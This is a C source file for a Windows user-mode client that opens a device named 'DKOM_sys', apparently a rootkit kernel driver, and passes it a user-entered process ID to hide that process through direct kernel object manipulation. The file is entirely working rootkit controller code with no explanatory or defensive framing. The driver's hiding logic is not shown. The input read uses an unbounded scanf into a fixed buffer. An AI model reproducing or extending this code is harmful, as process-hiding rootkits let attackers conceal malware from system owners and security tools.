#include <windows.h>
#include <stdio.h>


#define STATUS_FAILURE	0x00000001
#define STATUS_SUCCESS	0x00000000

#define RK_DKOM	0x00008001

#define DKOM_CODE CTL_CODE\
(RK_DKOM, 0x801, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)


LPCWSTR RkPath = L"\\\\.\\DKOM_sys";

int getDeviceHandle(HANDLE* pHandle)
{
	wprintf(L"Acquiring handle to %s\n", RkPath);


	*pHandle = CreateFile
	(
		RkPath,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (*pHandle == INVALID_HANDLE_VALUE)
	{
		wprintf(L"Failed to acquired handle to %s\n", RkPath);
		return STATUS_FAILURE;
	}

	return STATUS_SUCCESS;
}


int main(void)
{
	HANDLE hDevice;
	int retCode;
	BOOL opStatus;
	DWORD nBytesRead;
	char* pidSz;
	char* outputBuffer;

	pidSz			= (char*)malloc(sizeof(char) * 128);
	outputBuffer	= (char*)malloc(sizeof(char) * 128);

	if (pidSz == NULL || outputBuffer == NULL)
	{
		perror("malloc");
		return 1;
	}


	retCode = getDeviceHandle(&hDevice);

	if (retCode != STATUS_SUCCESS)
		return retCode;

	printf("Enter the PID of the process to be hidden:");
	scanf("%s", pidSz);


	// calls kmd
	opStatus = DeviceIoControl
			(
				hDevice,				// hDevice
				DKOM_CODE,				// IoCode
				pidSz,					// inputBuffer
				(DWORD)strlen(pidSz) + 1,		// inputBufferLen
				outputBuffer,			// outpuBuffer
				128,					//outBufferLen
				&nBytesRead,
				NULL
			);
	
	if (opStatus == FALSE)
		printf("DeviceIoControl failed: %x\n", GetLastError());

	return opStatus;

}